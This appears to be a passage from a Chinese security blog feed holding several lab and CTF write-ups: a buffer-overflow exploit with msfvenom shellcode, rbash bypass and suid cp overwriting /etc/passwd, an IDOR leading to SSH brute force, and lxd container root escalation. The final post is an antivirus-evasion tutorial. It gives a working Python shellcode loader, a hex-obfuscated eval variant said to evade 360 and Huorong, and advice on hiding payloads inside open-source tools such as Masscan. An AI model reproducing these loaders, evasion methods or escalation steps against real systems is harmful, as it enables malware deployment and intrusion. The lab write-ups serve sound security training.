alt="image-20201225001045022"></p><p>直接运行，发现dbg的寄存器发生变化，全部是424242 就是 BBB。</p><p><img src="https://img.rruu.net/image/5fe5430ae9df4" alt="image-20201225001126986"></p><p>如果需要进一步利用，需要过滤坏的字符串，我们使用python生成字符fuzz列表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;for i in range(1,256): print(&#39;\\x%02x&#39; % i, end&#x3D;&#39;&#39;)&quot;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe54310654a3" alt="image-20201225001605820"></p><p>复制到测试文件中</p><p><img src="https://img.rruu.net/image/5fe54314b00e2" alt="image-20201225001710190"></p><p>发现b0为坏字符，即/x4c后面的字符为坏字符，我们去除掉，然后重复此步骤。</p><p><img src="https://img.rruu.net/image/5fe543196a514" alt="image-20201225001804892"></p><p>重复测试，发现4e后面的字符为坏字符，去掉，重新测试一遍。</p><p><img src="https://img.rruu.net/image/5fe5431dd0472" alt="image-20201225002000692"></p><p>发现5e后面的字符为坏字符我们去掉重复测试。</p><p><img src="https://img.rruu.net/image/5fe543239954b" alt="image-20201225002050017"></p><p>最后得出，坏字符为，\x00这个字符别用，本身就是坏字符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x00\x4d\x4f\x5f\x79\x7e\x7f</span><br></pre></td></tr></table></figure><p>接下来，我们来查找jmp esp （栈指针寄存器）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">625012DD</span><br></pre></td></tr></table></figure><p>最终利用exp如下：</p><p><img src="https://img.rruu.net/image/5fe5432842108" alt="image-20201225003739440"></p><p>我们使用msf生成shellcode代码，使用-b参数去除坏字符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;messagebox TEXT&#x3D;&quot;hello magisec&quot; -f c -b &quot;\x00\x4d\x4f\x5f\x79\x7e\x7f&quot;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe5432cb4e81" alt="image-20201225004044656"></p><p>处理shellcode，如下：</p><p><img src="https://img.rruu.net/image/5fe543340b862" alt="image-20201225004939721"></p><p>使用python3运行</p><p><img src="https://img.rruu.net/image/5fe5433871d52" alt="image-20201225004954365">、</p><p>运行完成，出现弹窗，已经执行shellcode了。</p><p><img src="https://img.rruu.net/image/5fe5433cb0684" alt="image-20201225005032954"></p><h3 id="利用缓冲区溢出反弹root权限shell"><a href="#利用缓冲区溢出反弹root权限shell" class="headerlink" title="利用缓冲区溢出反弹root权限shell"></a>利用缓冲区溢出反弹root权限shell</h3><p>切回kali，配置监听。生成shellcode代码。</p><p><img src="https://img.rruu.net/image/5fe54341554a0" alt="image-20201225005935314"></p><p>我们在linux反弹一个shell回来，python代码如下：</p><p><img src="https://img.rruu.net/image/5fe543468813a" alt="image-20201225005848610"></p><p><img src="https://img.rruu.net/image/5fe5434b7ca25" alt="image-20201225010054043"></p><p>成功返回shell，读取flag文件。</p><p><img src="https://img.rruu.net/image/5fe543518507b" alt="image-20201225010211123"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux suid cp特权提升</title>
      <link href="2020/12/24/linux_suid_cp%E6%8F%90%E6%9D%83/"/>
      <url>2020/12/24/linux_suid_cp%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h2 id="Bypass-rbash限制"><a href="#Bypass-rbash限制" class="headerlink" title="Bypass rbash限制"></a>Bypass rbash限制</h2><h3 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh marcus@192.168.56.108 密码：3_d4y</span><br></pre></td></tr></table></figure><h3 id="查看shell"><a href="#查看shell" class="headerlink" title="查看shell"></a>查看shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">echo $SHELL</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe40427a1574" alt="image-20201218192950845"></p><p>发现是rbash，有命令限制，使用/bash/sh</p><h3 id="绕过rbash"><a href="#绕过rbash" class="headerlink" title="绕过rbash"></a>绕过rbash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh marcus@192.168.56.108 -t &quot;bash -noprofile&quot;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe4042c9f771" alt="image-20201218193051677"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="查看权限"><a href="#查看权限" class="headerlink" title="查看权限"></a>查看权限</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe40432c636e" alt="image-20201218193231100"></p><h3 id="搜索suid特权文件"><a href="#搜索suid特权文件" class="headerlink" title="搜索suid特权文件"></a>搜索suid特权文件</h3><p>发现cp命令有suid特权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -type f -perm -u&#x3D;s 2&gt; &#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe40437c3c5e" alt="image-20201218193341613"></p><h2 id="cp-提权"><a href="#cp-提权" class="headerlink" title="cp 提权"></a>cp 提权</h2><h3 id="生成password"><a href="#生成password" class="headerlink" title="生成password"></a>生成password</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -l -salt magisec 123456</span><br></pre></td></tr></table></figure><h3 id="修改passwd文件"><a href="#修改passwd文件" class="headerlink" title="修改passwd文件"></a>修改passwd文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd &gt; passwd.txt</span><br><span class="line">vi passwd.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe4043feb1a9" alt="image-20201218193726190"></p><h3 id="覆盖passwd文件"><a href="#覆盖passwd文件" class="headerlink" title="覆盖passwd文件"></a>覆盖passwd文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp &#x2F;tmp&#x2F;passwd.txt &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h3 id="切换用户完成提权"><a href="#切换用户完成提权" class="headerlink" title="切换用户完成提权"></a>切换用户完成提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su magisec 密码123456</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe4044595f6f" alt="image-20201218193937549"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>平行越权漏洞挖掘与phpsuid特权提升</title>
      <link href="2020/12/24/%E5%B9%B3%E8%A1%8C%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8Ephpsuid%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87/"/>
      <url>2020/12/24/%E5%B9%B3%E8%A1%8C%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8Ephpsuid%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87/</url>
      
        <content type="html"><![CDATA[<h2 id="80端口漏洞测试"><a href="#80端口漏洞测试" class="headerlink" title="80端口漏洞测试"></a>80端口漏洞测试</h2><h3 id="绕过XFF头ip验证"><a href="#绕过XFF头ip验证" class="headerlink" title="绕过XFF头ip验证"></a>绕过XFF头ip验证</h3><p>访问目标，发现验证来源ip。</p><p><img src="https://img.rruu.net/image/5fe3f04ae71f0" alt="image-20201219110309992"></p><p>修改xff头即可绕过，这里使用firefox的插件，<a href="https://github.com/MisterPhilip/x-forwarded-for%EF%BC%8C%E8%BF%99%E6%98%AFip%E4%B8%BA127.0.0.1">https://github.com/MisterPhilip/x-forwarded-for，这是ip为127.0.0.1</a></p><p><img src="https://img.rruu.net/image/5fe3f06d1f2af" alt="image-20201219110452887.png"></p><p>发现用户注册功能，这里注册一个magisec用户，密码同用户。</p><p><img src="https://img.rruu.net/image/5fe3f0fc48346" alt="image-20201219110532822.png"></p><p>登录成功</p><p><img src="https://img.rruu.net/image/5fe3f1114d139" alt="image-20201219110547540.png"></p><h3 id="SQLMap检测SQL注入"><a href="#SQLMap检测SQL注入" class="headerlink" title="SQLMap检测SQL注入"></a>SQLMap检测SQL注入</h3><p>发现仅profile文件存在利用价值，尝试对user_id参数进行注入测试。</p><p><img src="https://img.rruu.net/image/5fe3f2032d776" alt="image-20201219112144211"></p><p>sqlmap开始测试</p><p><img src="https://img.rruu.net/image/5fe3f2f3e5371" alt="image-20201219112209956"></p><p>直接跑死，手工测试不存在sql注入。</p><p><img src="https://img.rruu.net/image/5fe3f7f435011" alt="image-20201219112308053"></p><h3 id="平行越权挖掘与利用"><a href="#平行越权挖掘与利用" class="headerlink" title="平行越权挖掘与利用"></a>平行越权挖掘与利用</h3><p>修改user_id为1发现，存在水平越权，泄露用户名密码。</p><p><img src="https://img.rruu.net/image/5fe3fc07995d7" alt="image-20201219112417044"></p><p>两种利用方法，第一 使用burpsuite直接便利抓取用户信息 第二，自己编写爬虫脚本爬取信息。</p><h4 id="burpsuite抓取用户名信息"><a href="#burpsuite抓取用户名信息" class="headerlink" title="burpsuite抓取用户名信息"></a>burpsuite抓取用户名信息</h4><p>这里先演示burp suite</p><p>添加上用户名密码</p><p><img src="https://img.rruu.net/image/5fe3fc0ecff15" alt="image-20201219135115195"></p><p>payload设置纯数字</p><p><img src="https://img.rruu.net/image/5fe3fc1645899" alt="image-20201219135154421"></p><p><img src="https://img.rruu.net/image/5fe3fc72ab087" alt="image-20201219135140532"></p><p>点击start，查看结果。</p><p><img src="https://img.rruu.net/image/5fe3fc7c63d25" alt="image-20201219135225973"></p><p>将结果保存为user.txt与pass.txt即可</p><h4 id="Python-Bs4编写抓取脚本"><a href="#Python-Bs4编写抓取脚本" class="headerlink" title="Python Bs4编写抓取脚本"></a>Python Bs4编写抓取脚本</h4><p>第二，使用python编写脚本</p><p>代码如下：</p><p><img src="https://img.rruu.net/image/5fe3fc825e153" alt="image-20201219135710259"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 getinfo.py</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe3fc8a4f3fa" alt="image-20201219135647621"></p><p>收集用户名密码加工处理，爆破ssh，得到密码。</p><p><img src="https://img.rruu.net/image/5fe3fc902f751" alt="image-20201219140044096"></p><h2 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>收集基本信息</p><p><img src="https://img.rruu.net/image/5fe3fc96bd237" alt="image-20201219140507847"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p>发现php具有sudo权限，我们直接使用php来进行提权</p><h3 id="具有suid权限的php特权提升"><a href="#具有suid权限的php特权提升" class="headerlink" title="具有suid权限的php特权提升"></a>具有suid权限的php特权提升</h3><p><img src="https://img.rruu.net/image/5fe3fc9f222a0" alt="image-20201219140613095"></p><p>获取flag</p><p><img src="https://img.rruu.net/image/5fe3fca60826e" alt="image-20201219140653525"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux 虚拟容器 lxc提权</title>
      <link href="2020/12/23/Linux_lxc%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87/"/>
      <url>2020/12/23/Linux_lxc%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87/</url>
      
        <content type="html"><![CDATA[<p>id查看用户基本信息，发现在lxd用户组，使用lxd提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/U7bf0b26d6bd44358807976317912ca02c.jpg" alt="image-20201218101628436"></p><p>github构建提权环境</p><p><a href="https://github.com/saghul/lxd-alpine-builder">https://github.com/saghul/lxd-alpine-builder</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo .&#x2F;build-alpine</span><br></pre></td></tr></table></figure><p>然后回自动生成一个tar.gz文件，重命名成t.tar.gz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv alpine-v3.12-x86_64-20201217_1534.tar.gz t.tar.gz</span><br></pre></td></tr></table></figure><p>将t.tar.gz文件传输到目标主机上面，使用python开启http服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure><p>目标主机使用wget下载t.tar.gz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.56.105&#x2F;t.tar.gz</span><br></pre></td></tr></table></figure><p>需要先初始化环境 一切默认</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxd init</span><br></pre></td></tr></table></figure><p>查看一下image</p><p><img src="https://ae01.alicdn.com/kf/U90208be63fe242d39b5c49412ef95821g.jpg" alt="image-20201218102502019"></p><p>发现没有任何镜像，我们导入一下镜像，然后再次查看。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc image import .&#x2F;t.tar.gz --alias dmagicsec</span><br></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/Ue9ece94b2eb54f5b809b09c83d6acdd9L.jpg" alt="image-20201218102541247"></p><p>初始化容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc init dmagicsec dmagicsec -c security.privileged&#x3D;true</span><br></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/U53b7ba71a3594eb6a94cebed6bffcbf7F.jpg" alt="image-20201218103022044"></p><p>映射容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc config device add dmagicsec dmagicsec disk source&#x3D;&#x2F; path&#x3D;&#x2F;mnt&#x2F;root recursive&#x3D;true</span><br></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/U1d240e92373341f9afd8c3eceb5c4c46e.jpg" alt="image-20201218103045116"></p><p>启动容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc start dmagicsec</span><br></pre></td></tr></table></figure><p>执行交互shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc exec dmagicsec &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p><img src="https://s3.ax1x.com/2020/12/23/r6HNHf.png" alt="image-20201218103123276"></p><p>获取flag</p><p><img src="https://ae01.alicdn.com/kf/U590ad272f52243c991fc63f3a0c744c0K.jpg" alt="image-20201218103254958"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Shellcode免杀入门教程</title>
      <link href="2020/12/23/shellcode%E5%85%8D%E6%9D%80/"/>
      <url>2020/12/23/shellcode%E5%85%8D%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<h2 id="Shellcode执行工具编写思路"><a href="#Shellcode执行工具编写思路" class="headerlink" title="Shellcode执行工具编写思路"></a>Shellcode执行工具编写思路</h2><p>为了给大家讲怎么写shellcode执行盒，我特地找了一段Python的源代码，给大家分析。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;&quot;&quot;&quot;</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="built_in">len</span>(shellcode)),ctypes.c_int(<span class="number">0x3000</span>),ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">ht=ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.c_int(ptr),ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure><p>首先引入ctypes模块，接着将shellcode代码赋值给变量hex解码（MSF或Cs生成的之后，使用编码工具手动编码一次。），转换为字节数组。然后，使用ctypes，调用windows自带的dll，也就是Kernel32，使用VirtualAlloc函数，分配内存，返回分配的首地址。然后再使用RtlMoveMemory，将shellcode拷贝到目标内存。使用CreateThread创建一个线程，使用WaitForSingleObject执行内存。总之，就是调用Kernel32.dll中的函数来编写Shellcode执行工具，不止这一种放法。作者水平有限，请勿断章取义。</p><h2 id="编写Shellcode执行工具"><a href="#编写Shellcode执行工具" class="headerlink" title="编写Shellcode执行工具"></a>编写Shellcode执行工具</h2><p>为了验证我们前面的思路是正确的，让我用其他语言来验证一下。这里，我们使用易语言吧，尽可能让大家看懂编写过程。</p><p>新建一个windows窗口程序</p><p><img src="https://img.rruu.net/image/5fd5d92d1c176" alt="image-20201213155240640.png"></p><p>画一个界面出来，大概就这样。</p><p><img src="https://img.rruu.net/image/5fd5d92d1c78f" alt="image-20201211165535513"></p><p>双击按钮来到添加事件，来到编辑界面。添加一个精易模块，等会要用他里面的方法来编写shellcode。创建shellcode变量，用来储存shellcode。</p><p><img src="https://img.rruu.net/image/5fd5d92d1f9bf" alt="image-20201211170702523"></p><p>查看模块手册，就会发现模块自带VirtualAlloc RtlMoveMemory CreateThread WaitForSingleObject这四个方法，我们直接使用即可。</p><p>最终编写如下，如果你仔细比对Python源代码，你会发现真的基本上就是差不多的。</p><p><img src="https://img.rruu.net/image/5fd5d92d1f8d7" alt="image-20201211171754154"></p><p>最后，让我们来测试一下吧。</p><p>MSF生成一个小弹窗测试一下。</p><p><img src="https://img.rruu.net/image/5fd5d92d7cd4d" alt="image-20201211173115244"></p><p>使用一下K8飞刀的编码工具</p><p><img src="https://img.rruu.net/image/5fd5d636ef847" alt="image-20201213161344141"></p><p>获得编码以后的shellcode </p><p><img src="https://img.rruu.net/image/5fd5d6179229d" alt="image-20201213161359195"></p><p>获得HEx编码的Shellcode，复制粘贴到加载测试工具中，点击加载shellcode。我们就可以执行啦。</p><p><img src="https://img.rruu.net/image/5fd5d66d35008" alt="image-20201211173225308"></p><p>最后，总结一下，我们的思路没有错，确实是这样写的，各位不妨试试其他语言写一下，自己多动手体会体会啦。</p><h2 id="Shellcode上线免杀思路"><a href="#Shellcode上线免杀思路" class="headerlink" title="Shellcode上线免杀思路"></a>Shellcode上线免杀思路</h2><p>个人经验告诉你，用Python Ruby这类解释型语言，打包成EXE就算是正常程序也很有可能被拦截，而像C和GO以及C++这种编译型语言则不会有这种问题。建议各位免杀，放在虚拟机，并且断网防止被上传，自己弄了老半天的东西免杀成了，却坚持不了多久。还有也不要上传VT等杀毒网站，会被厂商拿去分析的。免杀的时候也不要上传到类似于360的云查杀。下面我来叙述一下我的思路。</p><p>首先，我给出一段免杀360与火绒的Python加载器源代码。细心的小伙伴们可能会发现，这跟上面第一部分我给出的源代码很像。对的，这个就是在那个基础上运用了一下加密手段，来进行免杀的。使用hex将，360查杀的部分给藏了起来。在运行的时候，首先解密字符串，然后eval执行，运用了等价替换的思路。问题来了，我为什么知道360查杀这里？这里给大家一个小方法，那就是不断的FUzz。像下文这段代码，我发现去掉ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))，然后打包成exe，360则不查杀，就是不断的去尝试，最后知道他查杀哪里。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import ctypes</span><br><span class="line"></span><br><span class="line">a &#x3D; &quot;shellcode&quot;</span><br><span class="line">shellcode&#x3D;bytearray(a.decode(&quot;hex&quot;))</span><br><span class="line">ptr &#x3D; ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))</span><br><span class="line">buf &#x3D; (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">shell &#x3D; &quot;6374797065732e77696e646c6c2e6b65726e656c33322e52746c4d6f76654d656d6f7279286374797065732e635f696e7428707472292c206275662c206374797065732e635f696e74286c656e287368656c6c636f6465292929&quot;</span><br><span class="line">eval(shell.decode(&quot;hex&quot;))</span><br><span class="line">ht &#x3D; ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure><p>第二个思路，使用一些正常滴开源项目，在里面加点料，达到免杀。经过本人不断地测试，发现效果属实顶。VT查杀轻轻松松可以控制在8左右。而且，相对于第一个思路来说，也更加容易，适合新手朋友。这里给出效果图，使用的是Masscan。</p><p><img src="https://img.rruu.net/image/5fd5d6d8157f2" alt="1"></p><p>稍微给Masscan加了点料</p><p><img src="https://img.rruu.net/image/5fd5d6fa908c7" alt="image-20201211175252005"></p><h2 id="Shellcode免杀实战"><a href="#Shellcode免杀实战" class="headerlink" title="Shellcode免杀实战"></a>Shellcode免杀实战</h2><p>首先，去github上随手一搜索C写的程序，你开心就好。然后下载到本地，打开。我这里用的是vs2019，你们也可以用其他的，没有硬性要求。第一，这里准备两个东西，一个是base64加密解密的code，另外一个是反转字符串的code。第二，找开源程序的时候，注意文件大小，太小的效果不好，太大的又太臃肿，几百K左右也可以，但是其实也没有那么大的硬性要求。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">static const unsigned char pr2six[256] &#x3D;</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;* ASCII table *&#x2F;</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,</span><br><span class="line">    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,</span><br><span class="line">    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,</span><br><span class="line">    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64</span><br><span class="line">&#125;;</span><br><span class="line">int Base64decode_len(const char* bufcoded)</span><br><span class="line">&#123;</span><br><span class="line">    int nbytesdecoded;</span><br><span class="line">    register const unsigned char* bufin;</span><br><span class="line">    register int nprbytes;</span><br><span class="line">    bufin &#x3D; (const unsigned char*)bufcoded;</span><br><span class="line">    while (pr2six[*(bufin++)] &lt;&#x3D; 63);</span><br><span class="line">    nprbytes &#x3D; (bufin - (const unsigned char*)bufcoded) - 1;</span><br><span class="line">    nbytesdecoded &#x3D; ((nprbytes + 3) &#x2F; 4) * 3;</span><br><span class="line">    return nbytesdecoded + 1;</span><br><span class="line">&#125;</span><br><span class="line">int Base64decode(char* bufplain, const char* bufcoded)</span><br><span class="line">&#123;</span><br><span class="line">    int nbytesdecoded;</span><br><span class="line">    register const unsigned char* bufin;</span><br><span class="line">    register unsigned char* bufout;</span><br><span class="line">    register int nprbytes;</span><br><span class="line">    bufin &#x3D; (const unsigned char*)bufcoded;</span><br><span class="line">    while (pr2six[*(bufin++)] &lt;&#x3D; 63);</span><br><span class="line">    nprbytes &#x3D; (bufin - (const unsigned char*)bufcoded) - 1;</span><br><span class="line">    nbytesdecoded &#x3D; ((nprbytes + 3) &#x2F; 4) * 3;</span><br><span class="line">    bufout &#x3D; (unsigned char*)bufplain;</span><br><span class="line">    bufin &#x3D; (const unsigned char*)bufcoded;</span><br><span class="line">    while (nprbytes &gt; 4) &#123;</span><br><span 